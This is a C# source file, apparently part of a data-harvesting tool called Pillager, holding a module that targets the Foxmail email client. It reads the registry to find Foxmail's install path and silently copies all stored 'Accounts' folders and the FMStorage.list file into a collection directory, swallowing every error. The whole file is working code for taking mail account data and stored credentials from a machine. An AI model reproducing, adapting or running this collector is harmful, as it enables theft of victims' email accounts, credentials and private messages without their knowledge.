using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Mails
{
    internal class Foxmail
    {
        public static string MailName = "Foxmail";

        public static string GetInstallPath()
        {
            try
            {
                string foxPath = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command")?.GetValue("").ToString();
                foxPath = foxPath?.Remove(foxPath.LastIndexOf("Foxmail.exe", StringComparison.Ordinal)).Replace("\"", "");
                return foxPath;
            }
            catch { return ""; }            
        }
        public static void Save(string path)
        {
            try
            {
                string installpath = GetInstallPath();
                if (!Directory.Exists(installpath) || !Directory.Exists(Path.Combine(installpath, "Storage"))) return;
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(installpath, "Storage"));
                foreach (var directory in directoryInfo.GetDirectories("Accounts", SearchOption.AllDirectories))
                {
                    Methods.CopyDirectory(directory.FullName, Path.Combine(savepath, Path.GetFileName(Path.GetDirectoryName(directory.FullName)) + "\\Accounts"), true);
                }
                if (File.Exists(Path.Combine(installpath, "FMStorage.list"))) File.Copy(Path.Combine(installpath, "FMStorage.list"), Path.Combine(savepath, "FMStorage.list"));
            }
            catch { }
        }
    }
}
